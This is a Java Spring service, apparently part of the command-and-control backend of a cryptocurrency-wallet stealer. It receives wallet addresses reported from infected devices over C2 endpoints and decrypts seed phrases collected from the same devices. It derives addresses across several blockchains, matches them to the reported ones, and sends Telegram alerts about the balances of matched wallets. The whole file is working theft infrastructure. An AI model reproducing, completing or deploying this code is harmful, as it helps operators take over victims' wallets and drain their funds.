package com.consume.service;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executor;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSONObject;
import com.consume.dao.Address4Dao;
import com.consume.dao.MnemonicDao;
import com.consume.dao.ReportedAddressDao;
import com.consume.entity.Address4Entity;
import com.consume.entity.MnemonicEntity;
import com.consume.entity.ReportedAddressEntity;
import com.consume.util.AddressNormUtil;
import com.consume.util.AesStoreCipher;
import com.consume.util.ReportedAddressExtractor;
import com.consume.util.WalletDerivator;
import com.consume.util.WalletSourceUtil;

/**
 * 上报地址入库 + 与助记词多 index 撞库匹配。
 * us/ub/uj 无序：任一侧到达都可触发；匹配成功后再查余额发消息。
 */
@Service
public class ReportedAddressMatchService {

    private static final Logger log = LoggerFactory.getLogger(ReportedAddressMatchService.class);

    private final ConcurrentHashMap<String, Long> matchDedup = new ConcurrentHashMap<>();

    @Autowired
    private ReportedAddressDao reportedAddressDao;
    @Autowired
    private MnemonicDao mnemonicDao;
    @Autowired
    private Address4Dao address4Dao;
    @Autowired
    private MnemonicTelegramService mnemonicTelegramService;

    @Autowired
    @Qualifier("walletDeriveExecutor")
    private Executor walletDeriveExecutor;

    @Value("${news4.mnemonic.mnemonic-aes-key:${news4.mnemonic.encrypt-key:}}")
    private String mnemonicAesKey;

    @Value("${news4.reported-address.match-index-max:5}")
    private int matchIndexMax;

    @Value("${news4.reported-address.match-mnemonic-limit:20}")
    private int matchMnemonicLimit;

    @Value("${news4.reported-address.match-addr-limit:200}")
    private int matchAddrLimit;

    @Value("${news4.reported-address.enabled:true}")
    private boolean enabled;

    /** /ub：拆地址入库并触发匹配 */
    public void ingestUb(C2HandlerContext ctx, JSONObject plaintext, Integer decryptId) {
        if (!enabled || ctx == null) {
            return;
        }
        List<ReportedAddressExtractor.Extracted> list = ReportedAddressExtractor.fromUb(plaintext);
        int n = persistExtracted(ctx, plaintext, "ub", decryptId, list);
        if (n > 0) {
            scheduleMatch(ctx.getDeviceId(), ctx.getDeviceRowId(), ctx.getChannelcode(), ctx.getClientIp());
        }
    }

    /** /uj：能解析则入库并触发匹配 */
    public void ingestUj(C2HandlerContext ctx, JSONObject plaintext, Integer decryptId) {
        if (!enabled || ctx == null) {
            return;
        }
        List<ReportedAddressExtractor.Extracted> list = ReportedAddressExtractor.fromUj(plaintext);
        int n = persistExtracted(ctx, plaintext, "uj", decryptId, list);
        if (n > 0) {
            scheduleMatch(ctx.getDeviceId(), ctx.getDeviceRowId(), ctx.getChannelcode(), ctx.getClientIp());
        } else {
            log.debug("正常日志:[reported_address] /uj 未解析出地址, recordId={}", ctx.getRecordId());
        }
    }

    /** /us 入库后触发：有 pending 上报地址则撞库 */
    public void scheduleMatchAfterUs(String deviceId, Integer deviceRowId,
                                     String channelCode, String clientIp) {
        if (!enabled) {
            return;
        }
        scheduleMatch(deviceId, deviceRowId, channelCode, clientIp);
    }

    /**
     * @return true 至少命中一条上报地址（调用方可用此跳过「仅 index0 余额通知」重复）
     */
    public boolean matchNow(String deviceId, Integer deviceRowId,
                            String channelCode, String clientIp) {
        if (!enabled || deviceId == null || deviceId.isEmpty()) {
            return false;
        }
        try {
            return doMatch(deviceId, deviceRowId, channelCode, clientIp);
        } catch (Exception e) {
            log.info("异常日志:[reported_address] 匹配失败 deviceId={} err={}", deviceId, e.getMessage());
            return false;
        }
    }

    public void scheduleMatch(String deviceId, Integer deviceRowId,
                              String channelCode, String clientIp) {
        if (!enabled || deviceId == null || deviceId.isEmpty()) {
            return;
        }
        long now = System.currentTimeMillis();
        Long prev = matchDedup.put(deviceId, now);
        if (prev != null && now - prev < 800L) {
            return;
        }
        if (matchDedup.size() > 5000) {
            matchDedup.clear();
        }
        Runnable job = () -> {
            try {
                doMatch(deviceId, deviceRowId, channelCode, clientIp);
            } catch (Exception e) {
                log.info("异常日志:[reported_address] 异步匹配失败 deviceId={} err={}",
                        deviceId, e.getMessage());
            }
        };
        try {
            walletDeriveExecutor.execute(job);
        } catch (Exception ex) {
            job.run();
        }
    }

    private int persistExtracted(C2HandlerContext ctx, JSONObject plaintext, String sourcePath,
                                 Integer decryptId, List<ReportedAddressExtractor.Extracted> list) {
        if (list == null || list.isEmpty()) {
            return 0;
        }
        String deviceId = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        if (deviceId.isEmpty()) {
            return 0;
        }
        String walletCode = plaintext == null ? "" : str(plaintext, "a");
        String walletName = WalletSourceUtil.toWalletName(walletCode);
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        for (ReportedAddressExtractor.Extracted ex : list) {
            try {
                ReportedAddressEntity row = new ReportedAddressEntity();
                row.setDeviceId(deviceId);
                row.setEcid(deviceId);
                row.setAddress(ex.address);
                row.setAddressNorm(AddressNormUtil.normalize(ex.address));
                row.setChainType(ex.chainType);
                row.setWalletCode(walletCode);
                row.setWalletName(walletName);
                row.setSourcePath(sourcePath);
                row.setSourceRecordId((int) ctx.getRecordId());
                row.setSourceDecryptId(decryptId);
                row.setAccountHint(ex.accountHint == null ? "" : ex.accountHint);
                row.setBalanceHint(ex.balanceHint == null ? "" : ex.balanceHint);
                row.setMnemonicId(null);
                row.setMatchStatus("pending");
                row.setFirstSeenAt(now);
                row.setLastSeenAt(now);
                if (row.getAddressNorm() == null || row.getAddressNorm().isEmpty()) {
                    continue;
                }
                reportedAddressDao.upsert(row);
                ok++;
            } catch (Exception e) {
                log.info("异常日志:[reported_address] 入库失败 addr={} err={}",
                        ex.address, e.getMessage());
            }
        }
        if (ok > 0) {
            log.info("正常日志:[reported_address] 写入/更新 {} 条, path={}, deviceId={}, wallet={}",
                    ok, sourcePath, deviceId, walletName);
        }
        return ok;
    }

    private boolean doMatch(String deviceId, Integer deviceRowId,
                            String channelCode, String clientIp) {
        List<ReportedAddressEntity> pending = reportedAddressDao.listPendingByDevice(
                deviceId, Math.max(1, matchAddrLimit));
        if (pending == null || pending.isEmpty()) {
            return false;
        }
        List<MnemonicEntity> mnemonics = mnemonicDao.listByDeviceId(
                deviceId, Math.max(1, matchMnemonicLimit));
        if (mnemonics == null || mnemonics.isEmpty()) {
            log.debug("正常日志:[reported_address] 无候选助记词, deviceId={}, pending={}",
                    deviceId, pending.size());
            return false;
        }

        int indexMax = Math.max(0, matchIndexMax);
        double now = System.currentTimeMillis() / 1000.0;
        // mnemonicId -> 命中派生地址（用于写 address4 + 查余额）
        Map<Integer, List<WalletDerivator.DerivedAddress>> hitByMnemonic = new HashMap<>();
        Set<Long> matchedIds = new HashSet<>();

        for (MnemonicEntity m : mnemonics) {
            String plain = decryptMnemonic(m.getResult());
            if (plain == null || plain.isEmpty()) {
                continue;
            }
            // 仅内存缓存探测用的派生结果，禁止把 0..N 全写入 address4
            Map<String, Map<Integer, String>> derivedCache = new HashMap<>();
            Map<String, String> derivedRaw = new HashMap<>(); // chain#index -> raw address
            for (ReportedAddressEntity ra : pending) {
                if (matchedIds.contains(ra.getId())) {
                    continue;
                }
                String rawAddr = ra.getAddress() == null ? "" : ra.getAddress().trim();
                String canonical = AddressNormUtil.canonicalize(rawAddr);
                String pathChain = AddressNormUtil.chainFromPath(ra.getAccountHint());
                String chain = ra.getChainType() == null ? "unknown" : ra.getChainType().toLowerCase(Locale.ROOT);
                // 兼容历史脏数据：Tron hex 被标成 sol
                if (!pathChain.isEmpty()) {
                    chain = pathChain;
                } else if ("sol".equals(chain) && AddressNormUtil.tronHexToBase58(rawAddr) != null) {
                    chain = "tron";
                }
                if ("ton".equals(chain) || "unknown".equals(chain)) {
                    continue;
                }
                String want = AddressNormUtil.normalize(
                        canonical.isEmpty() ? (ra.getAddressNorm() == null ? rawAddr : ra.getAddressNorm()) : canonical);
                boolean hit = false;
                int hitIndex = -1;
                String hitAddr = null;
                String hitChain = "btc".equals(chain) ? "btc" : chain;
                String hitPathKey = hitChain;
                String[] chains;
                if ("eth".equals(chain)) {
                    chains = new String[]{"eth", "bsc"};
                } else if ("btc".equals(chain)) {
                    // 四种 BTC：BIP44/49/84/86，按地址前缀优先再全试；入库 chaintype 仍写 btc
                    chains = WalletDerivator.btcMatchKeys(canonical.isEmpty() ? rawAddr : canonical);
                } else {
                    chains = new String[]{chain};
                }
                for (String c : chains) {
                    Map<Integer, String> byIdx = derivedCache.computeIfAbsent(c, k -> new HashMap<>());
                    for (int i = 0; i <= indexMax; i++) {
                        String norm = byIdx.get(i);
                        if (norm == null) {
                            String raw = WalletDerivator.deriveOne(plain, c, i);
                            if (raw != null) {
                                norm = AddressNormUtil.normalize(raw);
                                byIdx.put(i, norm);
                                derivedRaw.put(c + "#" + i, raw);
                            }
                        }
                        if (norm != null && want.equals(norm)) {
                            hit = true;
                            hitIndex = i;
                            hitAddr = derivedRaw.get(c + "#" + i);
                            hitPathKey = c;
                            hitChain = WalletDerivator.isBtcDeriveKey(c) ? "btc" : c;
                            break;
                        }
                    }
                    if (hit) {
                        break;
                    }
                }
                if (hit) {
                    int updated = reportedAddressDao.markMatched(ra.getId(), m.getId(), now);
                    if (updated > 0) {
                        matchedIds.add(ra.getId());
                        hitByMnemonic
                                .computeIfAbsent(m.getId(), k -> new ArrayList<>())
                                .add(new WalletDerivator.DerivedAddress(hitChain, hitIndex, hitAddr, hitPathKey));
                        log.info("正常日志:[reported_address] 匹配成功 deviceId={} mnemonicId={} chain={} pathKey={} index={} addr={}",
                                deviceId, m.getId(), hitChain, hitPathKey, hitIndex, ra.getAddress());
                    }
                }
            }
        }

        if (hitByMnemonic.isEmpty()) {
            return false;
        }
        for (Map.Entry<Integer, List<WalletDerivator.DerivedAddress>> e : hitByMnemonic.entrySet()) {
            Integer mnemonicId = e.getKey();
            List<WalletDerivator.DerivedAddress> hits = dedupeByChain(e.getValue());
            // address4：只写命中地址；其余链仅补 index0 自派生（每链一条）
            persistMatchedAddress4(mnemonicId, hits, now);
            try {
                mnemonicTelegramService.notifyBalanceAfterDeriveAsync(
                        mnemonicId, deviceRowId, deviceId, channelCode, clientIp, hits, true);
            } catch (Exception ex) {
                log.info("异常日志:[reported_address] 命中后余额通知失败 mnemonicId={} err={}",
                        mnemonicId, ex.getMessage());
            }
        }
        return true;
    }

    /**
     * address4 写入策略：
     * - 匹配成功的链：只保留命中那一条（先删该链旧行再插）
     * - 未命中的 eth/bsc/tron/btc/sol：只写 index0 自派生一条
     */
    private void persistMatchedAddress4(Integer mnemonicId,
                                        List<WalletDerivator.DerivedAddress> hits,
                                        double now) {
        if (mnemonicId == null) {
            return;
        }
        Set<String> hitChains = new HashSet<>();
        for (WalletDerivator.DerivedAddress da : hits) {
            if (da == null || da.chaintype == null || da.address == null) {
                continue;
            }
            String c = da.chaintype.toLowerCase(Locale.ROOT);
            hitChains.add(c);
            replaceAddress4(mnemonicId, da, now);
        }
        MnemonicEntity m = mnemonicDao.selectById(mnemonicId);
        String plain = m == null ? "" : decryptMnemonic(m.getResult());
        if (plain == null || plain.isEmpty()) {
            return;
        }
        for (String chain : new String[]{"eth", "bsc", "tron", "btc", "sol"}) {
            if (hitChains.contains(chain)) {
                continue;
            }
            String addr = WalletDerivator.deriveOne(plain, chain, 0);
            if (addr != null) {
                replaceAddress4(mnemonicId, new WalletDerivator.DerivedAddress(chain, 0, addr), now);
            }
        }
    }

    private void replaceAddress4(Integer mnemonicId, WalletDerivator.DerivedAddress da, double now) {
        if (da == null || da.chaintype == null || da.address == null) {
            return;
        }
        String chain = da.chaintype.toLowerCase(Locale.ROOT);
        try {
            address4Dao.deleteByMnemonicIdAndChain(mnemonicId, chain);
            Address4Entity a = new Address4Entity();
            a.setMnemonicId(mnemonicId);
            a.setAddress(da.address);
            a.setChaintype(chain);
            a.setAddrindex(da.addrIndex);
            a.setStatus(1);
            a.setAlgorithm(da.algorithm);
            a.setNativeBal("0");
            a.setUsdtBal("0");
            a.setUsdcBal("0");
            a.setBalanceRefreshedAt(now);
            a.setAddtime(now);
            address4Dao.upsert(a);
        } catch (Exception e) {
            log.info("异常日志:[reported_address] address4 写入失败 mnemonicId={} chain={} err={}",
                    mnemonicId, chain, e.getMessage());
        }
    }

    private static List<WalletDerivator.DerivedAddress> dedupeByChain(List<WalletDerivator.DerivedAddress> in) {
        Map<String, WalletDerivator.DerivedAddress> map = new HashMap<>();
        for (WalletDerivator.DerivedAddress da : in) {
            if (da == null || da.chaintype == null) {
                continue;
            }
            map.putIfAbsent(da.chaintype.toLowerCase(Locale.ROOT), da);
        }
        return new ArrayList<>(map.values());
    }

    private String decryptMnemonic(String stored) {
        if (stored == null || stored.isEmpty()) {
            return "";
        }
        try {
            if (mnemonicAesKey == null || mnemonicAesKey.isEmpty()) {
                return stored;
            }
            return AesStoreCipher.decrypt(stored, mnemonicAesKey);
        } catch (Exception e) {
            log.info("异常日志:[reported_address] 助记词解密失败 err={}", e.getMessage());
            return "";
        }
    }

    private static String str(JSONObject o, String k) {
        if (o == null || k == null) {
            return "";
        }
        Object v = o.get(k);
        return v == null ? "" : String.valueOf(v).trim();
    }
}
